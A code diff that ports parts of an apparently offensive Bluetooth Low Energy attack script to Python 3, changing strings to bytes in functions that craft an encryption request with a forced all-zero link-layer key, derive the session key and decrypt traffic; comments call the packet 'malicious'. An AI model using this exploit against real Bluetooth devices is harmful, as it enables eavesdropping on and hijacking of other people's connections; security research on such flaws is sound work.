@@ -122,7 +122,7 @@ def send_encrypted(pkt):
         access_address = raw_pkt[:4]
         header = raw_pkt[4]  # Get ble header
         length = raw_pkt[5] + 4  # add 4 bytes for the mic
-        crc = '\x00\x00\x00'  # Dummy CRC (Dongle automatically calculates it)
+        crc = b'\x00\x00\x00'  # Dummy CRC (Dongle automatically calculates it)
 
         pkt_count = bytearray(struct.pack("<Q", conn_tx_packet_counter)[:5])  # convert only 5 bytes
         pkt_count[4] |= 0x80  # Set for master -> slave
@@ -165,10 +165,10 @@ def receive_encrypted(pkt):
         mic = raw_pkt[6 + length: -3]  # Get mic from payload and exclude crc
         aes.verify(mic)
 
-        return BTLE(access_address + chr(header) + chr(length) + dec_pkt + '\x00\x00\x00')
+        return BTLE(access_address + chr(header) + chr(length) + dec_pkt + b'\x00\x00\x00')
     except Exception as e:
         print(Fore.RED + "MIC Wrong: " + e)
-        return BTLE(access_address + chr(header) + chr(length) + dec_pkt + '\x00\x00\x00')
+        return BTLE(access_address + chr(header) + chr(length) + dec_pkt + b'\x00\x00\x00')
 
 
 def defragment_l2cap(pkt):
@@ -184,7 +184,7 @@ def defragment_l2cap(pkt):
         fragment += raw(pkt[BTLE_DATA].payload)
         if pkt[BTLE_DATA].len >= fragment_left:
             fragment_start = False
-            pkt = BTLE(fragment + '\x00\x00\x00')
+            pkt = BTLE(fragment + b'\x00\x00\x00')
             pkt.len = len(pkt[BTLE_DATA].payload)  # update ble header length
             return pkt
         else:
@@ -308,11 +308,11 @@ while run_script:
             start_timeout('smp_timeout', SCAN_TIMEOUT, smp_timeout)
             # Pairing request accepted
             # ediv and rand are 0 on first time pairing
-            conn_iv = '\x00' * 4  # set IVm (IV of master)
-            conn_skd = '\x00' * 8  # set SKDm (session key diversifier part of master)
+            conn_iv = b'\x00' * 4  # set IVm (IV of master)
+            conn_skd = b'\x00' * 8  # set SKDm (session key diversifier part of master)
             enc_request = BTLE(
-                access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_ENC_REQ(ediv='\x00',
-                                                                                   rand='\x00',
+                access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_ENC_REQ(ediv=b'\x00',
+                                                                                   rand=b'\x00',
                                                                                    skdm=conn_iv,
                                                                                    ivm=conn_skd)
             driver.send(enc_request)  # Send the malicious packet (2/2)
@@ -322,13 +322,13 @@ while run_script:
             # Get IVs and SKDs from slave encryption response
             conn_skd += pkt[LL_ENC_RSP].skds  # SKD = SKDm || SKDs
             conn_iv += pkt[LL_ENC_RSP].ivs  # IV = IVm || IVs
-            conn_ltk = '\x00' * 16  # Link Layer Key (This is the key value for the attack)
+            conn_ltk = b'\x00' * 16  # Link Layer Key (This is the key value for the attack)
             conn_session_key = bt_crypto_e(conn_ltk[::-1], conn_skd[::-1])
             conn_packet_counter = 0
-            print(Fore.GREEN + 'Received SKD: ' + hexlify(conn_skd))
-            print(Fore.GREEN + 'Received  IV: ' + hexlify(conn_iv))
-            print(Fore.GREEN + 'Assumed  LTK: ' + hexlify(conn_ltk))
-            print(Fore.GREEN + 'AES-CCM  Key: ' + hexlify(conn_session_key))
+            print(Fore.GREEN + 'Received SKD: ' + str(hexlify(conn_skd)))
+            print(Fore.GREEN + 'Received  IV: ' + str(hexlify(conn_iv)))
+            print(Fore.GREEN + 'Assumed  LTK: ' + str(hexlify(conn_ltk)))
+            print(Fore.GREEN + 'AES-CCM  Key: ' + str(hexlify(conn_session_key)))
 
 
         # Slave will send LL_ENC_RSP before the LL_START_ENC_RSP
